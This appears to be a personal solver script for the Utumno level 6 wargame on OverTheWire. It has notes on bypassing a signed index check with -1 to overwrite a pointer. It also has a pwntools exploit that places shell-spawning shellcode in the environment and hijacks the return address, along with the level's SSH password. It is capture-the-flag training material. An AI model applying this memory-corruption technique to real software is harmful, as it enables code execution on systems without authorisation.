'''
ssh -p 2227 utumno6@utumno.labs.overthewire.org
pass: eiluquieth
'''

'''
argv[1] needs to base-10 (decimal) <= 10.
argv[2] needs to base-16 (hexadecimal).


Ideas:
- Use b.table[argv1_num] = argv2_num to write an integer to wherever I want in memory.
    - Overwrite b.p to point to the return address, and then `strcpy`.
        - argv[1] = offset to `b.p` (-1).
        - argv[2] = the return address.
        - argv[3] = value to write to return address.

    - Overwrite the return address.
        - This option failed because according to the equation below,
          eax (argv1_num) has to be equal 0xd. 0xd > 0xa (validation).


# Return address: 0xffbd022c [ebp+0x4]

# Overwrite b.p:
ebp + eax * 4 - 0x30 = ebp - 0x34
eax = -0x1
# Good! -0x1 < 0xa.


# Overwrite return address:
ebp + eax * 4 - 0x30 = ebp + 0x4
eax = 0xd
# Bad! 0xd > 0xa.
'''

import os
from pwn import *
shellcode = asm('nop') * 500 + asm(shellcraft.sh())
args = ['/utumno/utumno6', '-1', '0xffffdc0c', b'\xb0\xde\xff\xff']
env = dict(A=shellcode, PWD=os.getcwd())
gdbscript = '''
b *(main+0x98)
c
b *(main+0xae)
'''

s = ssh('utumno6', 'utumno.labs.overthewire.org', 2227, 'eiluquieth')

p = gdb.debug(args, gdbscript, env=env)
p = s.process(args, env=env)
